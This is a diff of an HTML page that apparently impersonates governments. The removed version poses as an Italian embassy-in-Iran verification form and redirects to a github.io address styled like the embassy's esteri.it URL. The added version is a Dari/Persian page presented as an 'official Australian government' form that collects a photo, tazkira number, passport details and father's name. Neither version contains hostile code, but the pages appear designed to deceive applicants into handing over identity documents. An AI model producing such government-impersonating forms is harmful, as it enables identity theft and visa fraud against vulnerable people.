@@ -1,195 +1,54 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="fa" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Verifica Dettagli UC</title>
-  <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Open Sans', sans-serif;
-      background-color: #f9f9f9;
-      color: #333;
-      display: flex;
-      flex-direction: column;
-      min-height: 100vh;
-    }
-
-    header {
-      background-color: #003366;
-      padding: 20px;
-      color: white;
-      text-align: center;
-    }
-
-    header img {
-      max-height: 60px;
-      margin-bottom: 10px;
-    }
-
-    header h1 {
-      font-size: 22px;
-      margin: 0;
-    }
-
-    main {
-      flex: 1;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
-
-    form {
-      background-color: #fff;
-      padding: 25px;
-      border-radius: 8px;
-      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
-      width: 100%;
-      max-width: 420px;
-    }
-
-    input, button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 10px;
-      font-size: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      box-sizing: border-box;
-    }
-
-    button {
-      background-color: #003366;
-      color: white;
-      border: none;
-      font-weight: bold;
-      margin-top: 20px;
-      transition: background-color 0.3s ease;
-    }
-
-    button:hover {
-      background-color: #005fa3;
-    }
-
-    #error {
-      color: red;
-      text-align: center;
-      margin-top: 10px;
-      display: none;
-    }
-
-    #loadingScreen {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background-color: white;
-      z-index: 1000;
-      justify-content: center;
-      align-items: center;
-    }
-
-    #loadingScreen img {
-      width: 70px;
-      height: 70px;
-    }
-
-    footer {
-      background-color: #f0f0f0;
-      padding: 15px;
-      text-align: center;
-      font-size: 14px;
-    }
-
-    .social a {
-      margin: 0 8px;
-      color: #003366;
-      text-decoration: none;
-    }
-
-    @media (max-width: 480px) {
-      header h1 {
-        font-size: 18px;
-      }
-
-      form {
-        padding: 20px;
-      }
-
-      input, button {
-        font-size: 14px;
-      }
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>فرم رسمی استرالیا</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <header>
-    <img src="logo.png" alt="Repubblica Italiana Logo" />
-    <h1>Verifica Dettagli UC</h1>
+  <header class="header">
+    <img src="logo.png" alt="لوگوی استرالیا" class="logo">
+    <h1>فرم درخواست رسمی کشور استرالیا</h1>
   </header>
 
   <main>
-    <form id="verifyForm">
-      <input type="text" id="name" placeholder="Nome" required />
-      <input type="text" id="lastname" placeholder="Cognome" required />
-      <input type="date" id="dob" required />
-      <input type="text" id="passport" placeholder="Passaporto (opzionale)" />
-      <input type="text" id="clientno" placeholder="Numero Cliente" required />
-      <button type="submit">Verifica</button>
-      <p id="error">I dati inseriti non sono corretti.</p>
+    <form action="#" method="POST" enctype="multipart/form-data">
+      <div class="form-group">
+        <label for="photo">عکس پرسونلی:</label>
+        <input type="file" id="photo" name="photo" accept="image/*" onchange="previewImage(event)" required>
+        <img id="preview" class="photo-preview" src="#" alt="پیش‌نمایش عکس" style="display: none;">
+      </div>
+
+      <div class="form-group"><label for="name">اسم:</label><input type="text" id="name" name="name" required></div>
+      <div class="form-group"><label for="lastname">تخلص:</label><input type="text" id="lastname" name="lastname" required></div>
+      <div class="form-group"><label for="father">اسم پدر:</label><input type="text" id="father" name="father" required></div>
+      <div class="form-group"><label for="nationality">ملیت:</label><input type="text" id="nationality" name="nationality" required></div>
+      <div class="form-group"><label for="birthdate">تاریخ تولد:</label><input type="date" id="birthdate" name="birthdate" required></div>
+      <div class="form-group"><label for="tazkira">نمبر تذکره:</label><input type="text" id="tazkira" name="tazkira" required></div>
+      <div class="form-group"><label for="passport">نمبر پاسپورت:</label><input type="text" id="passport" name="passport" required></div>
+      <div class="form-group"><label for="issue_date">تاریخ صدور پاسپورت:</label><input type="date" id="issue_date" name="issue_date" required></div>
+      <div class="form-group"><label for="expiry_date">تاریخ انقضا پاسپورت:</label><input type="date" id="expiry_date" name="expiry_date" required></div>
+
+      <div class="form-group">
+        <label for="message">نامه یا پیام:</label>
+        <textarea id="message" name="message" rows="6" required></textarea>
+      </div>
+
+      <button type="submit">ارسال فرم</button>
     </form>
   </main>
 
-  <div id="loadingScreen">
-    <img src="Loading.gif" alt="Caricamento...">
-  </div>
-
-  <footer>
-    <div class="social">
-      <a href="https://www.instagram.com/italyiniran/" target="_blank">Instagram</a>
-      <a href="https://www.youtube.com/channel/UCd2txiPLDY7WfWRaXYmqgiw" target="_blank">YouTube</a>
-      <a href="https://twitter.com/italyiniran" target="_blank">X</a>
-    </div>
+  <footer class="footer">
+    <p>&copy; 2025 - دولت استرالیا | تمامی حقوق محفوظ است</p>
   </footer>
 
   <script>
-    document.getElementById('verifyForm').addEventListener('submit', function (e) {
-      e.preventDefault();
-      document.getElementById('error').style.display = 'none';
-      document.getElementById('loadingScreen').style.display = 'flex';
-
-      setTimeout(() => {
-        fetch('data.json')
-          .then(response => response.json())
-          .then(data => {
-            const name = document.getElementById('name').value.trim();
-            const lastname = document.getElementById('lastname').value.trim();
-            const dob = document.getElementById('dob').value; // بدون trim برای date
-            const clientno = document.getElementById('clientno').value.trim();
-
-            document.getElementById('loadingScreen').style.display = 'none';
-
-            if (
-              name === data.name &&
-              lastname === data.lastname &&
-              dob === data.dob &&
-              clientno === data.clientno
-            ) {
-              window.location.href = 'https://ambteheran.github.io/https-ambteheran.esteri.it-it-/';
-            } else {
-              document.getElementById('error').style.display = 'block';
-            }
-          })
-          .catch(err => {
-            document.getElementById('loadingScreen').style.display = 'none';
-            console.error('Errore nel caricamento dei dati:', err);
-          });
-      }, 2500);
-    });
+    function previewImage(event) {
+      const preview = document.getElementById('preview');
+      preview.src = URL.createObjectURL(event.target.files[0]);
+      preview.style.display = 'block';
+    }
   </script>
 </body>
 </html>
